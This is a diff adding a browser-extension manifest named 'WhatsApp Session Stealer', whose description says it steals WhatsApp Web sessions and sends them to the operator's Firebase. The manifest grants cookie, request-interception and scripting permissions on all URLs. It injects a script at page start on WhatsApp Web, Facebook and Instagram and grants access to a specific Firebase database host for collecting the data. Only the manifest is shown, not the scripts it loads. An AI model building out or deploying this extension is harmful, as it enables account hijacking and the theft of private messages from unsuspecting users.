@@ -1,0 +1,41 @@
+{
+  "manifest_version": 3,
+  "name": "WhatsApp Session Stealer",
+  "version": "1.0",
+  "description": "Steals WhatsApp Web session & sends to your Firebase",
+  "permissions": [
+    "cookies",
+    "webRequest",
+    "webRequestBlocking",
+    "storage",
+    "scripting",
+    "activeTab"
+  ],
+  "host_permissions": [
+    "<all_urls>",
+    "https://web.whatsapp.com/*",
+    "https://*.facebook.com/*",
+    "https://*.instagram.com/*",
+    "https://sessionid-d86e2-default-rtdb.firebaseio.com/*"
+  ],
+  "background": {
+    "service_worker": "bg.js"
+  },
+  "content_scripts": [
+    {
+      "matches": [
+        "https://web.whatsapp.com/*",
+        "https://*.facebook.com/*",
+        "https://*.instagram.com/*"
+      ],
+      "js": ["inject.js"],
+      "run_at": "document_start"
+    }
+  ],
+  "action": {
+    "default_popup": "popup.html"
+  },
+  "icons": {
+    "128": "icon.png"
+  }
+}
